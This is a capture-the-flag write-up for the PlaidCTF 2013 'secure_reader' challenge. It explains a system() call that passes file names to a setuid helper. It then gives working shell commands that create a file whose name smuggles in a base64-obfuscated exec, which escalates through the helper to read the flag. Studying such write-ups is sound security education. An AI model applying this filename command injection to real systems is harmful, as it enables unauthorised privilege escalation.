---
title: secure_reader - PlaidCTF 2013
author: IdolfHatler
layout: post
published: true
date: 2013-05-06 22:57:18
---

Challenge description:

> <pre>I can't figure out how to read the flag :-( ssh to 54.224.109.162</pre>

Two different programs existed in ``/home/securereader/``. ``reader`` was a regular binary which
tried to output the content of a file in -- however it checked that the file was
diretory whitelist. If it could not open the file, then it did a:

    system("/home/securereader/secure_reader %s" % file)

This program was a setuid binary, which contained a whitelist too, but it also
checked if its parent was ``/home/securereader/reader``.

This challenge could easily be solved with a small bit of ugly shellfoo:

```bash
$ touch ';exec $(echo L2hvbWUvc2VjdXJlcmVhZGVyL3NlY3VyZV9yZWFkZXIgL3RtcC9tb25rZXkvZmxhZwo=|base64 -d)'
$ chmod -r ';exec $(echo L2hvbWUvc2VjdXJlcmVhZGVyL3NlY3VyZV9yZWFkZXIgL3RtcC9tb25rZXkvZmxhZwo=|base64 -d)'
$ /home/securereader/reader ';exec $(echo L2hvbWUvc2VjdXJlcmVhZGVyL3NlY3VyZV9yZWFkZXIgL3RtcC9tb25rZXkvZmxhZwo=|base64 -d)'
This may only be called by /home/securereader/reader
that_was_totally_a_good_idea
```
